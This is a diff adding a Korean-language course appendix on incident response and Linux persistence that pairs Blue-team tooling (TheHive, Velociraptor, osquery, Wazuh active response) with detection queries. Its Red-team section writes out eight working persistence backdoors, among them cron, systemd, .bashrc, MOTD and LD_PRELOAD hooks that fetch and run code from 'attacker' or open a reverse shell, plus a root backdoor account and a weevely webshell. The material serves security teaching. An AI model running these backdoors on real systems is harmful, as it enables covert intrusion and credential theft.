@@ -1250,3 +1250,246 @@ graph LR
 
 **학생 액션**: Data Theft 사례 1건을 4단계로 분해.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course11 — Week 09 IR + 지속성)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | TheHive 사고 케이스 | TheHive 5 |
+| s2 | Wazuh AR 자동 격리 | Wazuh AR + ansible |
+| s3 | Velociraptor live forensic | velociraptor |
+| s4 | Volatility 메모리 | volatility3 |
+| s5 | osquery persistence | osquery |
+| s6 | Cron 백도어 (Red) | crontab + reverse shell |
+| s7 | SSH key 주입 (Red) | ssh-keygen + authorized_keys |
+| s8 | weevely PHP webshell (Red) | weevely |
+
+### Blue 환경 (IR 도구)
+
+```bash
+ssh ccc@10.20.30.100
+
+# TheHive 5
+docker run -d --name thehive -p 9000:9000 strangebee/thehive:5.2
+
+# Cortex (analyzer + responder)
+docker run -d --name cortex -p 9001:9001 thehiveproject/cortex:latest
+
+# IRIS-DFIR (modern IR platform)
+git clone https://github.com/dfir-iris/iris-web ~/iris
+cd ~/iris && docker compose up -d
+
+# Velociraptor (이미)
+sudo systemctl start velociraptor
+
+# Volatility 3
+pip install volatility3
+
+# osquery
+sudo apt install -y osquery
+```
+
+### Red — Persistence 8 기법
+
+```bash
+# === 1. Cron 백도어 (간단) ===
+(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s attacker:8080/c | bash") | crontab -
+crontab -l                                              # 확인
+
+# === 2. SSH key 주입 (재접속 보장) ===
+# 공격자 머신:
+ssh-keygen -t ed25519 -f /tmp/persist -N ""
+
+# 침투한 host 에서:
+cat >> ~/.ssh/authorized_keys << 'EOF'
+ssh-ed25519 AAAA... attacker
+EOF
+
+# 또는 ssh-copy-id
+cat /tmp/persist.pub | ssh ccc@target 'cat >> ~/.ssh/authorized_keys'
+ssh -i /tmp/persist ccc@target                         # 재접속 (비번 없이)
+
+# === 3. systemd user service (재부팅 후에도) ===
+mkdir -p ~/.config/systemd/user
+cat > ~/.config/systemd/user/persist.service << 'EOF'
+[Unit]
+Description=Persist
+[Service]
+ExecStart=/usr/bin/curl -s attacker:8080/cmd | bash
+Restart=always
+[Install]
+WantedBy=default.target
+EOF
+systemctl --user enable --now persist.service
+loginctl enable-linger ccc                             # 로그아웃 후에도
+
+# === 4. /etc/passwd 추가 (root 권한 시) ===
+sudo openssl passwd -1 -salt xyz Pa\$\$w0rd
+# $1$xyz$abc...
+echo "backdoor:$1$xyz$abc...:0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
+su - backdoor                                          # uid=0 root!
+
+# === 5. .bashrc / .profile 후킹 ===
+cat >> ~/.bashrc << 'EOF'
+# Persistent reverse shell on shell start
+nohup bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1' &>/dev/null &
+EOF
+
+# === 6. MOTD hook (login 시 트리거) ===
+sudo tee /etc/update-motd.d/99-persist << 'EOF'
+#!/bin/bash
+nohup curl -s attacker:8080/c | bash &>/dev/null &
+EOF
+sudo chmod +x /etc/update-motd.d/99-persist
+
+# === 7. LD_PRELOAD ===
+# /etc/ld.so.preload 에 악성 .so 추가
+cat > /tmp/evil.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+__attribute__((constructor))
+void init() {
+    system("nohup curl -s attacker:8080/c | bash &");
+}
+EOF
+gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c
+sudo echo "/tmp/evil.so" >> /etc/ld.so.preload
+# 모든 dynamic-linked binary 가 evil.so load
+
+# === 8. weevely PHP webshell (web 침투 후) ===
+sudo apt install -y weevely
+weevely generate Pa\$\$w0rd /tmp/shell.php
+# /tmp/shell.php 를 web server 의 /var/www/html 에 업로드 후
+weevely http://target/shell.php Pa\$\$w0rd
+
+# 인터랙티브 shell:
+# www-data@target> :system_info
+# www-data@target> :file_download /etc/shadow
+# www-data@target> :sql_console
+```
+
+### Blue — Persistence 자동 점검 (osquery)
+
+```bash
+# === osquery 표준 query (모든 persistence 영역) ===
+
+# 1) Crontab
+osqueryi 'SELECT * FROM crontab;'
+osqueryi 'SELECT * FROM cron WHERE event = "user";'
+
+# 2) systemd services
+osqueryi 'SELECT name, fragment_path, source_path FROM systemd_units WHERE active_state = "active";'
+
+# 3) Authorized SSH keys
+osqueryi 'SELECT * FROM authorized_keys WHERE algorithm IN ("ssh-rsa","ssh-ed25519");'
+
+# 4) /etc/passwd 의 새 user (UID 0)
+osqueryi 'SELECT * FROM users WHERE uid = 0;'
+
+# 5) Login script
+osqueryi 'SELECT * FROM file WHERE path LIKE "/etc/profile.d/%";'
+
+# 6) LD_PRELOAD
+osqueryi 'SELECT * FROM file WHERE path = "/etc/ld.so.preload";'
+
+# 7) Modules (kernel rootkit)
+osqueryi 'SELECT * FROM kernel_modules;'
+
+# 8) suid/sgid
+osqueryi 'SELECT path, uid, gid, mode FROM file WHERE mode LIKE "4%" AND directory = "/usr/bin";'
+
+# === 자동화 (Fleet — multi-host osquery) ===
+docker run -d -p 8080:8080 fleetdm/fleet:latest
+
+# Live query 모든 host
+fleetctl query --hosts="hosts.label='production'" \
+    --query "SELECT * FROM crontab;"
+```
+
+### Velociraptor (live forensic)
+
+```bash
+# 1) Server 시작
+sudo velociraptor --config /etc/velociraptor.config.yaml frontend
+# → https://localhost:8889
+
+# 2) Client (모든 endpoint 에 배포)
+# 자동 enroll
+
+# 3) Hunt (모든 호스트 동시 검색)
+velociraptor query "
+SELECT FullPath FROM glob(globs='/var/www/**/*.php')
+WHERE FullPath LIKE '%shell%' OR FullPath LIKE '%cmd%'
+"
+
+# 4) Specific artifact 실행
+velociraptor flow create EvidenceOfCompromise \
+    --client.id all \
+    --artifacts \
+        Linux.Sys.AuthorizedKeys \
+        Linux.Sys.Crontab \
+        Linux.Sys.SSHHostKeys \
+        Generic.Detection.Yara.Process
+
+# 5) 결과 download
+velociraptor downloads list
+```
+
+### Wazuh AR (자동 격리)
+
+```bash
+# Wazuh rule level 13+ → AR 자동 호출
+sudo tee /var/ossec/active-response/bin/quarantine.sh << 'EOF'
+#!/bin/bash
+HOST=$3
+ssh ccc@10.20.30.1 "sudo nft add element inet filter blocked '{ $HOST }'"
+
+# 사용자 잠금 (compromised 사용자)
+USER=$5
+[ -n "$USER" ] && sudo passwd -l $USER && sudo pkill -KILL -u $USER
+
+# Persistence 자동 제거
+sudo rm -f /etc/ld.so.preload
+sudo crontab -r
+sudo find ~/.config/systemd/user -name "persist.service" -delete
+EOF
+sudo chmod +x /var/ossec/active-response/bin/quarantine.sh
+
+# /var/ossec/etc/ossec.conf
+# <command><name>quarantine</name><executable>quarantine.sh</executable></command>
+# <active-response><command>quarantine</command><location>local</location><level>13</level></active-response>
+```
+
+### IR Cycle (자동화)
+
+```bash
+# 1) 침투 탐지 (Falco/Wazuh)
+# 2) TheHive case 자동 생성
+curl -X POST http://thehive:9000/api/case \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"title":"Persistence detected","severity":3,"description":"..."}'
+
+# 3) Velociraptor evidence 수집
+velociraptor flow create EvidenceOfCompromise --client.id $HOST
+
+# 4) Volatility 메모리 분석 (필요 시)
+sudo insmod ~/lime/lime-$(uname -r).ko 'path=/forensic/mem.lime format=lime'
+vol -f /forensic/mem.lime linux.pslist
+vol -f /forensic/mem.lime linux.bash
+
+# 5) Wazuh AR 자동 격리
+
+# 6) Persistence 제거
+osquery 결과 → ansible playbook → 모든 persistence 자동 제거
+
+# 7) 보고서 (TheHive case → markdown)
+curl http://thehive:9000/api/case/$CASE_ID/export \
+    -H "Authorization: Bearer $TOKEN" | \
+    pandoc - -o /tmp/case-report.pdf --pdf-engine=xelatex
+```
+
+학생은 본 9주차에서 **Blue (TheHive + Velociraptor + osquery + Volatility + Wazuh AR + Falco) ↔ Red (cron + SSH key + systemd + LD_PRELOAD + weevely)** 의 IR + persistence 공방을 OSS 도구로 익힌다.
